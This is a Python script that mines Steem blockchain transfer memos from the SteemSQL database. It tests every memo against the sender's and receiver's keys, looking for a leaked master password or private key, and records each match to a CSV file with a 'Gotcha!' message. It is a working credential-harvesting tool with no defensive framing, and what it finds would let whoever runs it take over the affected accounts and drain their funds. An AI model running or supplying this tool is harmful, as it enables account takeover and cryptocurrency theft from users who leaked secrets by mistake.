import csv
import pymssql
import json
from steembase.account import PrivateKey, PasswordKey
from multiprocessing import Process, Queue, Manager


WORKERS = 8

q = '''
SELECT
  TxTransfers.*,
  sender.owner sender_owner,
  sender.active sender_active,
  sender.posting sender_posting,
  sender.memo_key sender_memo_key,
  receiver.owner receiver_,
  receiver.active receiver_active,
  receiver.posting receiver_posting,
  receiver.memo_key receiver_memo_key
FROM TxTransfers
INNER JOIN Accounts as sender
ON TxTransfers."from" = sender.name
INNER JOIN Accounts as receiver
ON TxTransfers."to" = receiver.name
WHERE TxTransfers.type = 'transfer' 
AND TxTransfers.memo != '';
'''


def get_keys(field):
    return [key_auth[0] for key_auth in json.loads(field)['key_auths']]


def get_public_keys_from_fields(public_keys_by_account, account_name, owner_field, active_field, posting_field,
                                memo_key_field):
    if account_name not in public_keys_by_account:
        public_keys_by_account[account_name] = {
            'owner': get_keys(owner_field),
            'active': get_keys(active_field),
            'posting': get_keys(posting_field),
            'memo': [memo_key_field],
        }
    return public_keys_by_account[account_name]


def get_public_key_from_password(shared_dict, account_name, password):
    if account_name + password not in shared_dict:
        shared_dict[account_name + password] = str(
            PasswordKey(account_name, password, 'owner').get_private_key().pubkey)
    return shared_dict[account_name + password]


def get_public_key_from_private(shared_dict, priv_key):
    if priv_key not in shared_dict:
        shared_dict[priv_key] = str(PrivateKey(priv_key).pubkey)

    return shared_dict[priv_key]


def worker(
        pid,
        transactions_queue,
        results_queue,
        public_keys_from_passwords,
        public_keys_from_private_keys
):
    print('[{}] worker started'.format(pid))

    while not transactions_queue.empty():
        i, account_name, public_keys, memo = transactions_queue.get()
        print('[{}][{}] Testing "{}" against "{}"'.format(i, pid, account_name, memo))

        public_owner_key = get_public_key_from_password(public_keys_from_passwords, account_name, memo)
        if public_owner_key in public_keys['owner']:
            print("[{}] Gotcha! Found main password for '{}' account: {}".format(pid, account_name, memo))
            results_queue.put((account_name, 'password', memo,))
        else:
            try:
                some_public_key = get_public_key_from_private(public_keys_from_private_keys, memo)
                for role in ['posting', 'active', 'owner', 'memo']:
                    for key in public_keys[role]:
                        if key == some_public_key:
                            print(
                                "[{}] Gotcha! Found private {} key for '{}' account: {}".format(
                                    pid, role, account_name, memo
                                )
                            )
                            results_queue.put((account_name, role, memo,))

            except AssertionError:
                print('[{}] AssertionError: {}'.format(pid, memo))
                continue

            except ValueError as e:
                if str(e) == 'Error loading Base58 object':
                    continue
                elif str(e) == 'Odd-length string':
                    continue

    print('[{}] worker ended'.format(pid))


def save_results(results_queue):
    tmp = set()
    with open('results.csv', 'w+') as file:
        writer = csv.writer(file, quotechar="\"", delimiter=";", escapechar="\\")
        writer.writerow(['account', 'type', 'memo'])

        while True:
            result = results_queue.get()
            if result == 'kill':
                break

            if result not in tmp:
                writer.writerow(result)
                file.flush()
                tmp.add(result)


def main():
    manager = Manager()
    existing_public_keys_by_account = {}
    public_keys_generated_from_potential_passwords = manager.dict()
    public_keys_generated_from_potential_private_keys = manager.dict()
    transactions = Queue()
    results = Queue()

    conn = pymssql.connect('sql.steemsql.com', 'steemit', 'steemit', 'DBSteem')
    cursor = conn.cursor()
    cursor.execute(q)

    with open('transactions.csv', 'w+') as file:
        writer = csv.writer(file, quotechar="\"", delimiter=";", escapechar="\\")
        writer.writerow((
            'id', 'tx_id', 'type', 'from', 'to', 'amount', 'amount_symbol', 'memo', 'request_id', 'timestamp',
            'sender_owner', 'sender_active', 'sender_posting', 'sender_memo_key',
            'receiver_owner', 'receiver_active', 'receiver_posting', 'receiver_memo_key')
        )

        for row in cursor:
            print('.', end='')
            writer.writerow([str(item).replace('\r\n', '') for item in row])

    with open('transactions.csv', 'r') as file:
        reader = csv.reader(file, quotechar="\"", delimiter=";", escapechar="\\")

        next(reader)  # skipping the header
        for i, (
                id_, tx_id, type_, from_, to_, amount, amount_symbol, memo, request_id, timestamp,
                sender_owner, sender_active, sender_posting, sender_memo_key,
                receiver_owner, receiver_active, receiver_posting, receiver_memo_key
        ) in enumerate(reader):

            sender_keys = get_public_keys_from_fields(
                existing_public_keys_by_account, from_, sender_owner, sender_active, sender_posting, sender_memo_key
            )
            receiver_keys = get_public_keys_from_fields(
                existing_public_keys_by_account, to_, receiver_owner, receiver_active, receiver_posting,
                receiver_memo_key
            )

            transactions.put((i, from_, sender_keys, memo))
            transactions.put((i, to_, receiver_keys, memo))

    processes = []
    for i in range(WORKERS):
        p = Process(target=worker, args=(
            i,
            transactions,
            results,
            public_keys_generated_from_potential_passwords,
            public_keys_generated_from_potential_private_keys
        ))
        p.start()
        processes.append(p)

    listener = Process(target=save_results, args=(results,))
    listener.start()

    for p in processes:
        p.join()

    results.put('kill')
    listener.join()

    print("end")


if __name__ == '__main__':
    main()
